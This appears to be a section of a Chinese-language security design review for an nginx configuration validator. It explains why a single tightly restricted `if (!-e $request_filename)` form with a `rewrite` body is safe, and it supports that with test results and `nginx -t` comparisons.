### 8.3 为什么这个极窄 `if` 不引入新攻击面

1. **体内指令集没有扩大**：`rewrite` 本来就能直接写在 `location` 里（`:515` 的位掩码含 `location`）。`if` 只是把**已允许的指令**放进一个文件存在性判断，没有把任何 location-only 指令搬进来。
2. **条件不依赖攻击者可控变量**：`(!-e $request_filename)` 只问「这个 URI 在站点根下有没有对应文件」，判断输入是服务端解析后的磁盘路径，请求方无法按意愿翻转该布尔值；全程不跑正则，没有 PCRE 回溯面。
3. **不能写文件 / 加载模块 / 记日志**：`include`、`load_module`、`log_format`、`access_log`、`error_log`、`perl*`、`lua_*`、`js_*`、`dav_*`、`*_temp_path` 在 `validateLeaf` 第一步的**无条件拒绝**就被挡下（`:404`、`:467`），走不到上下文判断——`if` 体内同样拒绝（实测报的是「无条件拒绝」，不是「不允许出现在 if 内」）。
4. **重写语义仍在 §3.3 第 3 条的既有约束内**：`rewrite` 的 replacement 与 flag 由同一个 `checkRewrite` 把关，没有新增「把请求代理到内网」的能力（那是 `proxy_pass`，`if` 内禁用）。

### 8.4 收紧的依据：不收紧会怎样

`if` 在 nginx 里是公认高危构造（官方 wiki 篇名 “If is Evil”），危险来自三处，本实现的收紧逐条对应：

| 不收紧的放开点 | 后果 | 本实现的限制 |
| --- | --- | --- |
| 任意**条件表达式**（`$http_*` / `$request_uri` / `$request_method` 参与比较或正则） | 分支由攻击者控制：可按请求头选择是否走重写；正则跑在攻击者可控串上 → worker 侧 PCRE 回溯 CPU DoS | 条件写死为 `(!-e $request_filename)` |
| 体内**任意指令**（尤其 `proxy_pass` / `auth_basic` / `try_files`） | `if` 会生成隐式嵌套配置，location 级指令不随之内联——公认形态是**绕过同一 location 的鉴权/匹配**，等价 auth bypass | 体内只留 `rewrite`（`:515` 唯一带 `nginxInIf`） |
| 条件里**构造变量**（`set` / `map` / `geo`） | 变量注入链：先写变量再在 `if` 里比较，可把 allowlist 内指令拼成任意行为 | `set`/`map`/`geo` 不在 allowlist；`${}` 复合变量在 tokenizer 层直接拒绝（`:253-254`、`:275`） |

一句话：收紧的落点是「**唯一条件 + 唯一体内指令 + 无变量构造**」；三者任一放开，`if` 就从模板语法糖变成可编程分支执行器，而 conf.d 片段最终由 **root master** 解析。

### 8.5 复核证据

- 正例：`pkg/pluginapi/nginxconf_test.go` 的 `TestNginxRealSiteVHostsAccepted`（`:338`）收录 thinkphp（`:345`）与 discuz（`:346`）模板；`FuzzValidateNginxVHostFragment`（`:371`）种子含 `if` 单行写法（`:381`）。
- 反例：`:86`（`if` 在 `server` 内 → 拒绝）、`:87`（条件换 `$request_method = POST` → 拒绝）。
- 本次实测（临时程序逐条调 `ValidateNginxVHostFragment`，未改仓库）：`if` 在顶层 / `if` 嵌套 `if` / 条件换 `$request_uri` / 条件换 `-f` / 条件后多余参数 → 全部拒绝；体内 `return`、`proxy_pass`、`root` → 「指令 X 不允许出现在 if 内」；体内 `access_log` → 无条件拒绝；体内 `rewrite` 四个 flag 全接受、非法 flag 拒绝。
- nginx 侧（`docker run nginx:alpine nginx -t`）：§8.1 那段标准形状 `syntax is ok`；空体 `if` 同样通过。
- 2026-11-24 收紧（本轮，G-06 闭环）：`TestNginxIfConditionTokenBoundary`（`pkg/pluginapi/nginxconf_test.go:124`）逐形态断言「校验器 ACCEPT ⇒ `nginx -t` ok」；`TestNginxStructuralRejects` 的「if 条件整体加引号」（`:88`）锁死反例。反例自证：临时回退到 `06d7bd6` 的 Join 实现后，该组 3 条用例 FAIL（引号形态被放行），恢复后全 PASS。
- 门禁：`bash scripts/docs-check.sh` exit 0；`make check` 20 段 exit 0。

### 8.6 未改变的与边界披露

- §3.3 第 2 条其余约束不变：顶层只允许 `server{}`、`location` 只在 `server` 内、`location` 不嵌套、深度 ≤4、指令数 ≤2048。
- `if` **不是**一般性能力：`location` 之外没有、体内除 `rewrite` 没有、条件除这一条没有。新增第二种 `if` 形状 = 扩内容安全边界，须走 §7#2 复审并在本节追加修订。
- **空体 `if`（`if (...) { }`）通过校验**，nginx 实测也接受，按 no-op 处理，不构成风险。
- **已修（2026-11-24，G-06 闭环；缺口由 `06d7bd6` 披露）**：旧实现把 `if` 条件 `strings.Join(args, " ")` 后与固定串比较，`if "(!-e $request_filename)"` 与规范形态归一结果相同而被放行，但 nginx 实测拒绝（整体是 1 个参数 → `[emerg] invalid condition "!-e $request_filename"`）。现判据改为**原始 token 序列**：必须恰为 `(!-e` + `$request_filename)` 两个 token（`nginxconf.go:446`）。契约方向是单向的：**校验器 ACCEPT ⇒ `nginx -t` ok**；比 nginx 更严的拒绝（括号内多余空格、右括号前空格、右括号在引号外）保留，不影响契约成立。
- **nginx 实测对照（docker `nginx:alpine`，2026-11-24，逐条 `nginx -t`）**：

| 形态 | token 数 | 校验器 | `nginx -t` |
| --- | --- | --- | --- |
| `if (!-e $request_filename)`（规范） | 2 | ACCEPT | `syntax is ok` |
| tab 分隔 | 2 | ACCEPT | `syntax is ok` |
| `if (!-e "$request_filename)"`（引号只包「变量+右括号」） | 2 | ACCEPT | `syntax is ok` |
| `if "(!-e $request_filename)"`（整体双引号） | 1 | **REJECT** | **fail**：`invalid condition "!-e $request_filename"` |
| `if '(!-e $request_filename)'`（整体单引号） | 1 | REJECT | fail：同上 |
| `if ((!-e $request_filename))`（双括号） | 2 | REJECT | fail：`invalid condition "(!-e"` |
| `if ( !-e $request_filename )`（括号内多余空格） | 4 | REJECT（更严） | `syntax is ok` |
| `if (!-e $request_filename )`（右括号前空格） | 3 | REJECT（更严） | `syntax is ok` |
| `if (!-e "$request_filename")`（右括号在引号外） | 3 | REJECT（更严） | `syntax is ok` |
| `if (!-e $request_filename) x`（条件后多余参数） | 3 | REJECT | fail：`invalid condition "x"` |

  结论：所有 ACCEPT 形态 nginx 均 `syntax is ok`；nginx 拒绝的形态全部 REJECT。空体 `if` 仍通过且 nginx 接受（见上一条）。
